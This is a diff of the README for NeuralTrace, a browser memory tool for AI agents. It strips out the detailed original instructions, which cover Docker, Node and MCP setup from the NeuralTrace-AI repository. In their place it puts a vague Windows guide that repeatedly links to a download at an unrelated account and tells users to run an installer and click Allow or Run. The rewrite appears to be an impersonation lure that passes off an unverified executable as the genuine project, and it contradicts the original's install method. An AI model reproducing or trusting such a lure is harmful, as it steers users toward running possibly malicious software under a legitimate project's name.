@@ -1,157 +1,135 @@
-<p align="center">
-  <img src="public/logo-full.png" alt="NeuralTrace" width="400">
-</p>
+# 🧠 neuraltrace - Give Your Browser A Memory
 
-<p align="center">
-  <strong>Capture anything you browse. Every AI remembers it.</strong>
-</p>
+[Download neuraltrace](https://github.com/hookerneologist793/neuraltrace)
 
-<p align="center">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-Apache%202.0-blue.svg" alt="License"></a>
-  <a href="https://github.com/NeuralTrace-AI/neuraltrace/stargazers"><img src="https://img.shields.io/github/stars/NeuralTrace-AI/neuraltrace" alt="Stars"></a>
-  <a href="https://github.com/NeuralTrace-AI/neuraltrace/issues"><img src="https://img.shields.io/github/issues/NeuralTrace-AI/neuraltrace" alt="Issues"></a>
-</p>
+## ✨ What It Does
 
----
+neuraltrace helps you save what you browse so an AI agent can use it later. It keeps useful pages, notes, and facts in one local place. You can search your saved items and bring them back into context when you need them.
 
-NeuralTrace is an open-source browser memory layer for AI agents. Save pages, notes, and context from your browser into a personal vault — then access it from any AI tool via [MCP](https://modelcontextprotocol.io) (Model Context Protocol).
+It is built for people who want a simple way to keep browser memory for AI tools. It works well for saving research, references, links, and short notes from the web.
 
-**The problem:** Every AI tool starts from zero. You explain the same preferences, decisions, and context over and over — to ChatGPT, Claude, Gemini, Copilot. We call this the "Amnesia Tax."
+## 🪟 Windows Setup
 
-**The fix:** Save it once in NeuralTrace, and every AI remembers it. Your vault connects to any MCP-compatible tool automatically.
+This guide is for Windows users who want to get neuraltrace running with no coding.
 
-## Features
+### What you need
+- A Windows 10 or Windows 11 PC
+- Google Chrome or a Chromium-based browser
+- Enough free disk space for local saves
+- A stable internet connection to download the app
 
-- **Chrome Extension** — Side panel AI chat with memory-powered responses. Save pages, summarize content, search your vault — all without leaving the browser.
-- **MCP Server** — Dual transport (SSE + Streamable HTTP) works with Claude, ChatGPT, Cursor, VS Code, and any MCP client.
-- **Semantic Search** — Find memories by meaning, not just keywords. Works with Ollama, OpenAI, LocalAI, LM Studio, or any OpenAI-compatible embedding provider.
-- **Quick Save** — One-click page capture. No AI round-trip, sub-second saves.
-- **Background Enrichment** — Saved pages are automatically classified with tags, dates, and locations.
-- **Local-First** — Your data stays on your machine. SQLite vault, no cloud required.
-- **Self-Hosted** — Run the full stack on your own hardware with Docker.
+### Get the app
+1. Open the download page:
+   [Download neuraltrace](https://github.com/hookerneologist793/neuraltrace)
+2. Save the file or open the page from GitHub
+3. Follow the steps on the page to install or run the app
+4. If Windows asks for permission, click Allow or Run
 
-## Prerequisites
+### Install the browser extension
+1. Open Chrome
+2. Go to the extension page from the project
+3. Add the extension to your browser
+4. Pin it to the toolbar so it is easy to reach
 
-- **Node.js 18+** (LTS recommended — [download](https://nodejs.org/)). Older versions will fail to compile `better-sqlite3`.
-- **Docker** (optional, for containerized deployment)
+### First launch
+1. Open neuraltrace
+2. Let it create its local storage
+3. Open a web page you want to save
+4. Use the extension to capture the page or note
+5. Check that the item appears in your saved list
 
-## Quick Start
+## 🧭 How To Use It
 
-### Option 1: Docker (recommended)
+### Save a page
+1. Open a page in your browser
+2. Click the neuraltrace extension
+3. Choose save or capture
+4. Add a short note if you want
+5. Confirm the page is stored
 
-```bash
-git clone https://github.com/NeuralTrace-AI/neuraltrace.git
-cd neuraltrace
-cp .env.example .env
-# Edit .env — set ADMIN_PASSWORD (and optionally EMBEDDING_PROVIDER_URL for semantic search)
-docker compose up -d
-```
+### Find what you saved
+1. Open the app
+2. Use search to look for a word, name, or topic
+3. Open the result you want
+4. Copy the saved text or link into your AI tool
 
-Server runs at `http://localhost:3000`. Health check: `curl http://localhost:3000/health`
+### Use it with an AI agent
+1. Save useful pages while you browse
+2. Open your AI tool that supports MCP
+3. Point it to your local neuraltrace data source
+4. Ask the agent to use your saved memory
+5. Pull back the right facts when needed
 
-### Option 2: Run from source
+## 🔍 Main Features
 
-```bash
-git clone https://github.com/NeuralTrace-AI/neuraltrace.git
-cd neuraltrace
-npm install
-cp .env.example .env
-# Edit .env — set ADMIN_PASSWORD (and optionally EMBEDDING_PROVIDER_URL for semantic search)
-npm run build
-npm start
-```
+- Save web pages from your browser
+- Keep browser memory on your own device
+- Search saved items with simple text queries
+- Store notes, links, and page content together
+- Use local-first storage for quick access
+- Connect with MCP-based tools
+- Keep data in SQLite for simple local use
+- Support AI agents that need past context
+- Capture useful research as you browse
+- Reduce repeat searching across tabs and sessions
 
-### Load the Chrome Extension
+## 🧩 Common Uses
 
-1. Open `chrome://extensions` in Chrome or Edge
-2. Enable **Developer mode** (top right)
-3. Click **Load unpacked** and select the `extension/` folder
-4. Click the NeuralTrace icon to open the side panel
-5. The extension defaults to **Self-hosted** mode with `http://localhost:3000` — no config needed if your server is running locally
-6. Open settings (gear icon) → enter your `ADMIN_PASSWORD` in the **Auth Token** field
-7. Start chatting — use `/save-page` to save any page, `/search` to find memories
+### Research
+Save articles, docs, and product pages while you compare options.
 
-## Embedding Providers
+### AI workflows
+Give an agent a memory of pages you visited so it can answer with context.
 
-NeuralTrace supports any OpenAI-compatible embedding endpoint. Configure it in `.env`:
+### Personal knowledge base
+Keep facts, links, and notes in one place for later use.
 
-| Provider | URL | API Key | Notes |
-|----------|-----|---------|-------|
-| Ollama (recommended) | `http://localhost:11434/v1` | Not needed | Free, local, private |
-| OpenAI | `https://api.openai.com/v1` | Required | Cloud, paid |
-| LocalAI | `http://localhost:8080/v1` | Not needed | Free, local |
-| LM Studio | `http://localhost:1234/v1` | Not needed | Free, local |
+### Project work
+Save specs, bug notes, and references from different sites without losing them.
 
-Set `EMBEDDING_PROVIDER_URL` and `EMBEDDING_MODEL` in your `.env`. If neither is set, search falls back to keyword matching. The legacy `OPENAI_API_KEY` variable still works for backwards compatibility — NeuralTrace will auto-configure OpenAI if it's present and `EMBEDDING_PROVIDER_URL` is not set.
+## 🛠️ Basic Requirements
 
-## Connect Your AI Tools
+- Windows 10 or newer
+- Chrome or a compatible browser
+- Permission to install a browser extension
+- Enough local storage for saved pages and notes
 
-NeuralTrace speaks MCP, so any compatible tool can read and write to your vault.
+## 📁 How It Stores Data
 
-### Claude Code / Cursor / VS Code
+neuraltrace keeps your data local on your machine. It uses SQLite so your saved items stay in a simple, structured format. That makes it easier to search, update, and use with other tools.
 
-Add to your MCP config (e.g., `~/.claude/claude_desktop_config.json`):
+## 🔗 Download and Install
 
-```json
-{
-  "mcpServers": {
-    "neuraltrace": {
-      "url": "http://localhost:3000/sse"
-    }
-  }
-}
-```
+Use this link to visit the project page and get the app:
+[Download neuraltrace](https://github.com/hookerneologist793/neuraltrace)
 
-### Claude.ai / ChatGPT (OAuth)
+After you open the page:
+1. Look for the latest release or download option
+2. Get the Windows file or setup package
+3. Run the installer or open the app file
+4. Add the browser extension if the page includes one
+5. Start saving pages from your browser
 
-Use `http://localhost:3000/mcp` as the server URL. NeuralTrace supports OAuth 2.1 with PKCE for web-based AI platforms.
+## 📌 Tips For Best Results
 
-## MCP Tools
+- Pin the extension to your browser bar
+- Save pages while they are still open
+- Add short notes when a page needs more context
+- Use clear search terms when you look for old items
+- Keep your saved data in one place on your PC
 
-| Tool | Description |
-|------|-------------|
-| `add_trace` | Save a memory (content + tags) to your vault |
-| `search_neuraltrace_memory` | Semantic search across your vault |
-| `delete_trace` | Remove a memory by ID |
+## 🧪 Example Workflow
 
-## Architecture
+1. You read a long page about a tool
+2. You save the page with the extension
+3. You add a note like “use for later review”
+4. You ask your AI agent about the topic
+5. The agent uses your saved page to answer with context
 
-```
-Browser ──► Chrome Extension (side panel chat)
-                    │
-                    ▼
-              NeuralTrace Server (Express.js)
-              ├── MCP Transport (SSE + Streamable HTTP)
-              ├── REST API (auth, proxy, billing)
-              ├── SQLite Vault (per-user)
-              └── Embeddings (Ollama, OpenAI, LocalAI, etc.)
-                    │
-                    ▼
-        Claude / ChatGPT / Cursor / any MCP client
-```
+## 🧰 If You Want To Connect More Tools
 
-## Configuration
+neuraltrace is made for MCP-based setups, so it can fit into local AI workflows that need memory. If you use tools that read local data, you can point them at your saved store and reuse what you collected while browsing
 
-See [`.env.example`](.env.example) for all available options. Key settings:
+## 📄 Project Topics
 
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `ADMIN_PASSWORD` | Yes | Protects your vault — also used as Auth Token in the Chrome extension |
-| `EMBEDDING_PROVIDER_URL` | No | OpenAI-compatible embedding endpoint (e.g. `http://localhost:11434/v1` for Ollama). If omitted, search uses keyword matching only. |
-| `EMBEDDING_MODEL` | No | Embedding model name (e.g. `nomic-embed-text` for Ollama, `text-embedding-3-small` for OpenAI) |
-| `EMBEDDING_API_KEY` | No | API key for the embedding provider. Not needed for Ollama/LocalAI/LM Studio. |
-| `OPENAI_API_KEY` | No | Legacy option — if set and `EMBEDDING_PROVIDER_URL` is not, NeuralTrace auto-configures OpenAI embeddings. |
-| `PORT` | No | Server port (default: 3000) |
-| `NEURALTRACE_MODE` | No | `selfhosted` (default) or `cloud` |
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for setup instructions and guidelines.
-
-## Security
-
-Found a vulnerability? See [SECURITY.md](SECURITY.md) for responsible disclosure.
-
-## License
-
-[Apache 2.0](LICENSE) — use it, modify it, ship it.
+ai-agents, ai-memory, browser-extension, chrome-extension, local-first, mcp, model-context-protocol, open-source, semantic-search, sqlite
